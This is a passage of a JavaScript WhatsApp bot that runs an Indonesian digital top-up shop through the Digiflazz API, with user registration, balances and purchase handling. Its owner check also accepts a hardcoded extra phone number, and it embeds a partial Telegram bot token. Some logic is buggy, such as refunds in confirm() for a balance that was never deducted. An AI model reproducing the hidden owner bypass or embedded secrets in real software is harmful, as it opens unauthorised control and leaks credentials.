require('./Pengaturan/Admin/settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs');
const chalk = require('chalk');
const axios = require('axios');
const path = require('path');
const moment = require('moment-timezone');
const ms = toMs = require('ms');
const FormData = require("form-data");
const { fromBuffer } = require('file-type')
const fetch = require('node-fetch')
const crypto = require('crypto')
const { sizeFormatter} = require("human-readable")
const format = sizeFormatter()
const os = require('os');
const { exec } = require("child_process");
const speed = require('performance-now');
const util = require('util')
const short = require('short-uuid');
const md5 = require('md5');
const PathTrx = "./trx/";
const PathAuto = "./Pengaturan/database/deposit/manual/"
const PathPasca = "./Pengaturan/database/pascabayar/";
const { getPpob, getPasca } = require('./Pengaturan/function/getpro')
const { color, bgcolor } = require('./Pengaturan/function/color')
global.tanggalserver = `${moment.tz('Asia/Jakarta').format('DD/MM/YY')}`;
global.waktuserver = `${moment.tz('Asia/Jakarta').format('HH:mm:ss')}`; 

let http = require('http')
            http.get({'host': 'api.ipify.org', 'port': 80, 'path': '/'}, function(resp) {
            resp.on('data', function(ip) {
                (global.ipserver = ip);
            })
          })

const { smsg, fetchJson, getBuffer } = require('./Pengaturan/function/simple')
  const sleep = exports.sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
      }
      
global.keytri = ' '//apikey
    global.privateKey = ' ' //private key
 global.merchantcode = ' '

global.db = JSON.parse(fs.readFileSync('./Pengaturan/database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

//━━━━━━━━━━━━━━━[ PREFIX ]━━━━━━━━━━━━━━━━━//


module.exports = kris = async (kris, msg, m, chatUpdate, store) => {
try {
    const { type, quotedMsg, mentioned, now, fromMe } = m
        const gakbisaowner = `${owner}@s.whatsapp.net`             
        const chats = msg.message.interactiveResponseMessage ? JSON.parse(msg.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
        if (chats == undefined) { chats = '' }
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '' 
        const command = chats.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const body = chats.startsWith(prefix) ? chats : ''
        const budy = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : ''
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(" ");  
        const text = args.join(" ");    
        const isCommand = chats.startsWith(prefix);        
        const isCmd = isCommand ? chats.slice(1).trim().split(/ +/).shift().toLowerCase() : null;
        const from = m.key.remoteJid
        const pushname = m.pushName || "No Name"
        const botNumber = await kris.decodeJid(kris.user.id)         
        const groupMetadata = m.isGroup ? await kris.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''         
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false        
        const content = JSON.stringify(msg.message)
        const itsMe = m.sender == botNumber ? true : false        
        const quoted = m.quoted ? m.quoted : m
        const qmsg = (quoted.msg || quoted)
        const mime = (quoted.msg || quoted).mimetype || ''
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
        const tanggal = moment().tz("Asia/Jakarta").format("ll")
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const tanggal3 = moment().tz('Asia/Jakarta').locale('id').format('dddd, D MMMM YYYY');
		const wayah = moment.tz('asia/jakarta').format('HH:mm:ss z')
		const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const time1 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time1 < "23:59:00") {
            var ucapanWaktu1 = 'Malam'
        }
        if (time1 < "19:00:00") {
            var ucapanWaktu1 = 'Malam'
        }
        if (time1 < "18:00:00") {
            var ucapanWaktu1 = 'Sore'
        }
        if (time1 < "15:00:00") {
            var ucapanWaktu1 = 'Siang'
        }
        if (time1 < "10:00:00") {
            var ucapanWaktu1 = 'Pagi'
        }
        if (time1 < "05:00:00") {
            var ucapanWaktu1 = 'Pagi'
        }
        if (time1 < "03:00:00") {
            var ucapanWaktu1 = 'Malam'
        }
        const hariini = moment.tz('Asia/Jakarta').locale('id').format('dddd,D MMM YYYY');
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')    
            
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const isOwner = [`${owner}@s.whatsapp.net`] == sender ? true : ["6285971817423@s.whatsapp.net"].includes(sender) ? true : false       
        const senderNumber = sender.split('@')[0]   
        const arg = budy.trim().substring(budy.indexOf(" ") + 1);
        const arg1 = arg.trim().substring(arg.indexOf(" ") + 1);	       
try {

ppnyaimg = await kris.sendMessage(m.sender, 'image')
} catch (err) {
ppnyaimg = ''
}


if (!kris.public) {
if (!m.key.fromMe) return
}
const reply = (teks) => {kris.sendMessage(from, { text: teks }, { quoted: m })}
    
var mdu = ['red','green','yellow','blue','magenta','cyan','white']
var halalu = mdu[Math.floor(Math.random() * mdu.length)]
var mdo = ['red','green','yellow','blue','magenta','cyan','white']
var halalo = mdo[Math.floor(Math.random() * mdo.length)]
var mdi = ['red','green','yellow','blue','magenta','cyan','white']
var halali = mdi[Math.floor(Math.random() * mdi.length)]
var mda = ['red','green','yellow','blue','magenta','cyan','white']
var halala = mda[Math.floor(Math.random() * mda.length)]
var mde = ['red','green','yellow','blue','magenta','cyan','white']
var halale = mde[Math.floor(Math.random() * mde.length)]

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(' kris Pedia '), color(`[ PESAN MASUK ]`, `${halalu}`), color(`FROM`, `${halalo}`), color(`${pushname}`, `${halali}`), color(`Text :`, `${halala}`), color(`${body}`, `${halale}`))
}
    
    
    
async function sendkrisMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await kris.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

let rn = ['recording','composing']
let jd = rn[Math.floor(Math.random() * rn.length)];

if (command) {
kris.sendPresenceUpdate(jd, from)
kris.readMessages([m.key])
}
function formatmoney(n, opt = {}) {
  if (!opt.current) opt.current = "IDR"
  return n.toLocaleString("id", { style: "currency", currency: opt.current })
}

function acakindong(min, max = null) {
  if (max !== null) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min + 1)) + min;
  } else {
  return Math.floor(Math.random() * min) + 1
  }
}

function sendMessageToTelegram(chatId, message) {
    const botToken = ''; // Ganti dengan token bot Anda
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const data = { chat_id: chatId, text: message };

    axios.post(url, data)
        .then(response => {
            console.log('Pesan berhasil dikirim:', response.data);
        })
        .catch(error => {
            console.error('Terjadi kesalahan:', error);
        });
}
function sendMessageToTelegram1(chatId, message) {
    const botToken = '7172644408:AAFtRzcPwc2j'; // Ganti dengan token bot Anda
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const data = { chat_id: chatId, text: message };

    axios.post(url, data)
        .then(response => {
            console.log('Pesan berhasil dikirim:', response.data);
        })
        .catch(error => {
            console.error('Terjadi kesalahan:', error);
        });
}

function toRupiah(angka) {
  var angkaStr = angka.toString();
  var angkaTanpaKoma = angkaStr.split('.')[0];
  var angkaRev = angkaTanpaKoma.toString().split('').reverse().join('');
  var rupiah = '';
for (var i = 0; i < angkaRev.length; i++) {
if (i % 3 == 0) rupiah += angkaRev.substr(i, 3) + '.';
}
return '' + rupiah.split('', rupiah.length - 1).reverse().join('');
}


const sendContact = (jid, numbers, name, quoted, mn) => {
let number = numbers.replace(/[^0-9]/g, '')
const vcard = 'BEGIN:VCARD\n' 
+ 'VERSION:3.0\n' 
+ 'FN:' + name + '\n'
+ 'ORG:;\n'
+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
+ 'END:VCARD'
return kris.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: quoted })
}

function generateRandomString(length) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  let result = '';
  const randomBytes = crypto.randomBytes(length);

  for (let i = 0; i < length; i++) {
    const byte = randomBytes[i] % chars.length;
    result += chars.charAt(byte);
  }

  return result.toLowerCase();
}

    const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? kris.sendMessage(from, {text: teks.trim(), jpegThumbnail: global.krismenu}, text, { sendEphemeral: true, contextInfo: { mentions: memberr } }) : kris.sendMessage(from, {text: teks.trim(), jpegThumbnail: global.krismenu}, text, { sendEphemeral: true, quoted: m, contextInfo: { mentions: memberr } })
}
    
const randomString = generateRandomString(5);


function boolToString(value) {
  return value ? 'iyah' : 'tidak';
}



const formatp = sizeFormatter({
  std: 'JEDEC', //'SI' = default | 'IEC' | 'JEDEC'
  decimalPlaces: 2,
  keepTrailingZeroes: false,
  render: (literal, symbol) => `${literal} ${symbol}B`,
})

const isUrl = (url) => {
  return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}

const jsonformat = (string) => {
  return JSON.stringify(string, null, 2)
}

function randomNomor(min, max = null) {

		  if (max !== null) {

			min = Math.ceil(min);

			max = Math.floor(max);

			return Math.floor(Math.random() * (max - min + 1)) + min;

		  } else {

			return Math.floor(Math.random() * min) + 1

		  }

		}
const fetchJson = async (url, options) => {
  try {
      options ? options : {}
      const res = await axios({
          method: 'GET',
          url: url,
          headers: {
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'
          },
          ...options
      })
      return res.data
  } catch (err) {
      return err
  }
}

function toLvl(input) {
  if (typeof input === 'number') {
    return (input / 100) + 1;
  } else if (typeof input === 'string') {
    const inputNumber = parseFloat(input.replace(',', '.'));
    if (!isNaN(inputNumber)) {
      return (inputNumber / 100) + 1;
    }
  }
  return "Masukan tidak valid";
}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: 'kris Bot',
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: 'Creator kris'
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "USD"
			}
		}
	}
}
      
var list_produk = JSON.parse(fs.readFileSync('./Pengaturan/database/datadigiflaz.json'))
var list_pasca = JSON.parse(
  fs.readFileSync("./Pengaturan/database/pascabayar.json")
);
var user = JSON.parse(fs.readFileSync('./Pengaturan/database/user.json'))
const profitt = JSON.parse(fs.readFileSync("./Pengaturan/database/profit.json"));
const profit = profitt.profit;  
const cek = (satu, dua) => { 
let x1 = false
Object.keys(user).forEach((i) => {
if (user[i].id == dua){x1 = i}})
if (x1 !== false) {
if (satu == "id"){ return user[x1].id }
if (satu == "layanan"){ return user[x1].layanan }
if (satu == "saldo"){ return user[x1].saldo }
if (satu == "harga"){ return user[x1].harga }
if (satu == "tujuan"){ return user[x1].tujuan }
if (satu == "reff"){ return user[x1].reff }
if (satu == "desc"){ return user[x1].desc }
if (satu == "status"){ return user[x1].status }    
if (satu == "kode_layanan"){ return user[x1].kode_layanan }
if (satu == "role"){ return user[x1].role }
}
if (x1 == false) { return null } 
}
let sett = (satu, dua, tiga) => { 
Object.keys(user).forEach((i) => {
if (user[i].id == dua){
if (satu == "+saldo")
{ user[i].saldo += tiga
fs.writeFileSync('./Pengaturan/database/user.json', JSON.stringify(user))}
if (satu == "-saldo"){
user[i].saldo -= tiga
fs.writeFileSync('./Pengaturan/database/user.json', JSON.stringify(user))}
if (satu == "harga"){ user[i].harga = tiga
fs.writeFileSync('./Pengaturan/database/user.json', JSON.stringify(user))} 
 if (satu == "status"){ user[i].status = tiga
fs.writeFileSync('./Pengaturan/database/user.json', JSON.stringify(user))}
if (satu == "layanan"){ user[i].layanan = tiga
fs.writeFileSync('./Pengaturan/database/user.json', JSON.stringify(user))}
if (satu == "tujuan"){ user[i].tujuan = tiga
fs.writeFileSync('./Pengaturan/database/user.json', JSON.stringify(user))}
if (satu == "desc"){ user[i].desc = tiga
fs.writeFileSync('./Pengaturan/database/user.json', JSON.stringify(user))}
if (satu == "kode_layanan"){ user[i].kode_layanan = tiga
fs.writeFileSync('./Pengaturan/database/user.json', JSON.stringify(user))}
if (satu == "reff"){ user[i].reff = tiga
fs.writeFileSync('./Pengaturan/database/user.json', JSON.stringify(user))}
if (satu == "role"){ user[i].role = tiga
fs.writeFileSync('./Pengaturan/database/user.json', JSON.stringify(user))}
}})
}

const daftarr = () => {
if(cek("id", m.sender) == null){
user.push({id: m.sender, saldo:0, role: "USER", layanan:"", harga:0, tujuan:"", kode_layanan: "", desc: "", reff: ""})
fs.writeFileSync('./Pengaturan/database/user.json', JSON.stringify(user))
 const suc = `──〔 *REGISTRASI SUKSES* 〕─
        
        _›› Nomor : ${m.sender.split("@")[0]}_
        _›› Saldo : ${cek("saldo", m.sender)}_
        _›› Role : ${cek("role", m.sender)}_
        
    _Terimakasih telah mendaftar semoga nyaman menggunakan layann yang i sediakan oleh kami_
    `
kris.sendMessage(m.chat, {text: `${suc}`},{quoted: m})
}
}
function formatMoney(nominal) {
  // Mengonversi angka menjadi string
  var strNominal = nominal.toString();
  // Mengambil bagian angka sebelum koma
  var hasil = strNominal.split('.')[0];
  // Mengonversi kembali menjadi angka
  return parseInt(hasil);
}
function hitungHargaRole(hargaAwal) {
    const user = cek("role", m.sender);

    if (!user) {
        return hargaAwal; // Mengembalikan harga awal jika data pengguna tidak ditemukan
    }
const userr = hargaAwal * profit.user;
const vip = hargaAwal * profit.vip;
const vvip = hargaAwal * profit.vvip;
const age = hargaAwal * profit.agen;
var aw = Number(hargaAwal) 
var us = formatMoney(userr) 
var vp = formatMoney(vip) 
var vips = formatMoney(vvip) 
var agen = formatMoney(age) 


    switch (user) {
        case "USER":
            return us; // Tambah 2%
        case "VIP":
            return vp;

            // Tambah 3%
        case "VVIP":
            return vips; 
        case "AGEN":
            return agen; 
        default:
            return us; // Mengembalikan harga awal jika role tidak sesuai
    }
}

function getMonthName(monthIndex) {
    const monthNames = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
    return monthNames[monthIndex];
}

function cekWaktu() {
    const waktuSekarang = new Date();
    
    const tahun = waktuSekarang.getFullYear();
    let bulan = waktuSekarang.getMonth() + 1; // Bulan dimulai dari 0, jadi perlu ditambah 1
    bulan = bulan < 10 ? '0' + bulan : bulan; // Menambahkan leading zero jika bulan kurang dari 10
    
    let tanggal = waktuSekarang.getDate();
    tanggal = tanggal < 10 ? '0' + tanggal : tanggal; // Menambahkan leading zero jika tanggal kurang dari 10
    
    let jam = waktuSekarang.getHours();
    jam = jam < 10 ? '0' + jam : jam; // Menambahkan leading zero jika jam kurang dari 10
    
    let menit = waktuSekarang.getMinutes();
    menit = menit < 10 ? '0' + menit : menit; // Menambahkan leading zero jika menit kurang dari 10
    
    let detik = waktuSekarang.getSeconds();
    detik = detik < 10 ? '0' + detik : detik; // Menambahkan leading zero jika detik kurang dari 10
    
    return `${tahun}-${bulan}-${tanggal} ${jam}:${menit}:${detik}`;
}


function generateRandomTicket(length) {
            var result = '';
            var characters = '0123456789';
            var charactersLength = characters.length;

            for (var i = 0; i < length; i++) {
                var randomIndex = Math.floor(Math.random() * charactersLength);
                result += characters.charAt(randomIndex);
            }
            result = '#' + result;
            return result;
        }
   async function getKateg(kategori) {
  const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: global.author }}}
    if (cek("id", m.sender) == null) return reply(`Anda Belum Terdaftar di Database Silahkan ketik #daftar`);
    
    let { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");
    let database = require('./Pengaturan/database/datadigiflaz.json');
    
    // Filter berdasarkan kategori
    let filteredProducts = database.filter(item => item.category === kategori);
    
    // Gunakan Set untuk memastikan hanya satu produk per brand
    let uniqueBrands = new Set();
    let uniqueFilteredProducts = filteredProducts.filter(item => {
        if (!uniqueBrands.has(item.brand)) {
            uniqueBrands.add(item.brand);
            return true;
        }
        return false;
    });
    
    // Buat sections untuk pesan
    let sections = [{
        title: kategori, // Title utama
        rows: uniqueFilteredProducts.map(item => {
            return {
                header: `${item.brand}`, 
                title: `${item.brand} Items`,
                id: `${prefix}gettypw ${item.brand}|${kategori}`
            };
        })
    }];
    
    // Buat JSON string untuk buttonParamsJson
    let buttonParamsJson = JSON.stringify({
        title: "Klik Disini",
        sections: sections
    });
    
    // Buat pesan interaktif
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `Silahkan Pilih merek Di Kategori ${kategori} Di Bawah Ini`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: global.toko
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [{
                            name: "single_select",
                            buttonParamsJson: buttonParamsJson
                        },
                                    {
              "name": "cta_url",
              "buttonParamsJson": `{\"display_text\":\"Contact Owner\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
            }]
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                    }
                })
            }
        }
    }, { userJid: m.sender, quoted: qdoc });
    
    // Kirim pesan interaktif
    await kris.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
async function getType(brand, kategori) {
  const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: global.author }}}
    if (cek("id", m.sender) == null) return reply(`Anda Belum Terdaftar di Database Silahkan ketik #daftar`);
    
    let { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");
    let database = require('./Pengaturan/database/datadigiflaz.json');
    
    // Filter berdasarkan kategori
    let filteredProducts = database.filter(item => item.brand === brand && item.category === kategori);
    
    // Gunakan Set untuk memastikan hanya satu produk per brand
    let uniqueBrands = new Set();
    let uniqueFilteredProducts = filteredProducts.filter(item => {
        if (!uniqueBrands.has(item.type)) {
            uniqueBrands.add(item.type);
            return true;
        }
        return false;
    });
    
    // Buat sections untuk pesan
    let sections = [{
        title: brand, // Title utama
        rows: uniqueFilteredProducts.map(item => {
            return {
                title: `${item.type}`,
                description: `Pilih Disini untuk menampilkan ${brand} Type ${item.type}`, 
                id: `${prefix}item ${brand}|${item.type}`
            };
        })
    }];
    
    // Buat JSON string untuk buttonParamsJson
    let buttonParamsJson = JSON.stringify({
        title: "Klik Disini",
        sections: sections
    });
    
    // Buat pesan interaktif
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `Silahkan Pilih merek Di Kategori ${brand} Di Bawah Ini`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: global.toko
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [{
                            name: "single_select",
                            buttonParamsJson: buttonParamsJson
                        },
                                    {
              "name": "cta_url",
              "buttonParamsJson": `{\"display_text\":\"Contact Owner\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
            }]
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                    }
                })
            }
        }
    }, { userJid: m.sender, quoted: qdoc });
    
    // Kirim pesan interaktif
    await kris.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}     
function salya(produk, tujuan, nama, harga) {
const { v4: uuidv4 } = require('uuid');
const generateCustomRefId = () => {
const uuid = uuidv4().replace(/-/g, ''); // Menghasilkan UUID dan menghapus karakter '-'
const refId = uuid.substr(0, 15);// Mengambil 20 digit pertama dari UUID
return refId;
}
fs.unlinkSync(PathTrx + sender.split('@')[0] + '.json');
const reffId = generateCustomRefId();
const har = parseFloat(harga);
sett("-saldo", m.sender, har) 
const signature = crypto.createHash('md5')
.update(digiuser + digiapi + reffId)
.digest('hex');
var config = {
method: 'POST',
url: 'https://api.digiflazz.com/v1/transaction',
data: {
"username": digiuser,
"buyer_sku_code": produk,
"customer_no": tujuan,
"ref_id": reffId,
"sign": signature
}
};
axios(config)
.then(async res => {
let invo = `*── 「 STATUS TRANSAKSI 」 ──*\n\n`
     invo += `_Pesananmu *${nama}* sedang diproses_\n`
     invo += `_Mohon tunggu..._`
     reply(invo);
    let status = res.data.data.status;  
    console.log(status)        
while (status !== 'Sukses') {
await sleep(1000); 
const response = await axios(config);
status = response.data.data.status; 
              if (status == "Gagal") {
              sett("+saldo", m.sender, har)

reply(`           _${toko}_\n       𝚂𝚝𝚛𝚞𝚔 𝙳𝚒𝚐𝚒𝚝𝚊𝚕 ( ${response.data.data.status} )\n══════════════════════\n_Tujuan :_ ${tujuan}\n_Layanan :_ ${nama}\n_Harga :_ ${formatmoney(harga)}\n_Mess :_ ${response.data.data.message} \n\n*Saldo Anda Bertambah dikarenakan produk gagal silahkan membeli dengan Methode saldo`)
               break;
              }
              
if (status == "Sukses") {
const sl = cek("saldo", m.sender) 
	const owl = `*ADA YANG TRANSAKSI NIH* 

*# INFORMASI TRANSAKSI :*
| *Status :* Sukses
| *Tanggal :* ${tanggal}
| *Tujuan :* ${tujuan}
| *Produk :* ${nama}
| *Trx 𝙸𝚍 :* ${response.data.data.ref_id}
| *Sn :* ${response.data.data.sn}

*# INFORMASI HARGA :*
| *Harga Modal :* ${formatmoney(response.data.data.price)}
| *Harga Jual :* ${formatmoney(har)}
| *Profit :* ${formatmoney(har - response.data.data.price)}

*# INFORMASI PENGGUNA:*
| *Nama :* ${pushname}
| *Role :* ${cek("role", m.sender)}
| *Transaksi Dari No :* ${m.sender.split('@')}
| *Saldo Pengguna :* ${formatmoney(sl)}

*# INFORMASI SALDO SERVER*
| *Sisa saldo Digi :* ${formatmoney(response.data.data.buyer_last_saldo)}`
  kris.sendMessage(`${owner}@s.whatsapp.net`, {text:owl});      
    reply(`✅ *「 𝚂𝚝𝚛𝚞𝚔 𝙳𝚒𝚐𝚒𝚝𝚊𝚕 」* ✅
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
*» ID* : ${tanggal + jam}
*» Layanan* : ${nama}
*» Data* : ${tujuan}
*» Harga* : Rp ${formatmoney(harga)}
*» Keterangan* : ${response.data.data.status} 

*O━•『SERIAL NUMBER』•━O*
${response.data.data.sn}

*${toko}*
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬`)
const trxFilePath = './Pengaturan/database/datatrx.json';
    const trxUserData = JSON.parse(fs.readFileSync(trxFilePath, 'utf8'));

    const newTransactionData = {
        buyer: m.sender,
        status: response.data.data.message,
        ref_id: response.data.data.ref_id,
        jam: moment.tz('Asia/Jakarta').format('HH:mm:ss'),
        date: tanggal, 
        produk: nama,
        harga_modal: response.data.data.price,
        harga: harga,
        tujuan: tujuan,
        invoice: response.data.data.sn
    };
    trxUserData.push(newTransactionData);
    fs.writeFileSync(trxFilePath, JSON.stringify(trxUserData, null, 2), 'utf8');    
break;
              }
            }
          })
          .catch(error => {
            if (error.response) {              
            sett("+saldo", m.sender, har)           
 reply(`           _${toko}_\n       𝚂𝚝𝚛𝚞𝚔 𝙳𝚒𝚐𝚒𝚝𝚊𝚕 ( ${error.response.data.data.status} )\n══════════════════════\n_Tujuan :_ ${tujuan}\n_Layanan :_ ${nama}\n_Harga :_ ${formatmoney(harga)}\n_Mess :_ ${error.response.data.data.message}\n\n*Saldo Anda Bertambah dikarenakan produk gagal silahkan membeli dengan Methode saldo*`) 
            }
   });
   
}        
        
        
function confirm(produk, tujuan, nama, harga) {
const { v4: uuidv4 } = require('uuid');
const generateCustomRefId = () => {
const uuid = uuidv4().replace(/-/g, ''); // Menghasilkan UUID dan menghapus karakter '-'
const refId = uuid.substr(0, 15);// Mengambil 20 digit pertama dari UUID
return refId;
}
fs.unlinkSync(PathTrx + sender.split('@')[0] + '.json');
const reffId = generateCustomRefId();
const har = parseFloat(harga);
const signature = crypto.createHash('md5')
.update(digiuser + digiapi + reffId)
.digest('hex');
var config = {
method: 'POST',
url: 'https://api.digiflazz.com/v1/transaction',
data: {
"username": digiuser,
"buyer_sku_code": produk,
"customer_no": tujuan,
"ref_id": reffId,
"sign": signature
}
};
axios(config)
.then(async res => {
let invo = `*── 「 STATUS TRANSAKSI 」 ──*\n\n`
     invo += `_Pesananmu *${nama}* sedang diproses_\n`
     invo += `_Mohon tunggu..._`
     reply(invo);
    let status = res.data.data.status;  
    console.log(status)        
while (status !== 'Sukses') {
await sleep(1000); 
const response = await axios(config);
status = response.data.data.status; 
              if (status == "Gagal") {
              sett("+saldo", m.sender, har)

                                reply(`           _${toko}_\n       𝚂𝚝𝚛𝚞𝚔 𝙳𝚒𝚐𝚒𝚝𝚊𝚕 ( ${response.data.data.status} )\n══════════════════════\n_Tujuan :_ ${tujuan}\n_Layanan :_ ${nama}\n_Harga :_ ${formatmoney(harga)}\n_Mess :_ ${response.data.data.message} \n\n*Saldo Anda Bertambah dikarenakan produk gagal silahkan membeli dengan Methode saldo`)
               break;
              }
              
if (status == "Sukses") {
const sl = cek("saldo", m.sender)    
const owl = `*ADA YANG TRANSAKSI NIH* 

*# INFORMASI TRANSAKSI :*
| *Status :* Sukses
| *Tanggal :* ${tanggal}
| *Tujuan :* ${tujuan}
| *Produk :* ${nama}
| *Trx 𝙸𝚍 :* ${response.data.data.ref_id}
| *Sn :* ${response.data.data.sn}

*# INFORMASI HARGA :*
| *Harga Modal :* ${formatmoney(response.data.data.price)}
| *Harga Jual :* ${formatmoney(harga)}
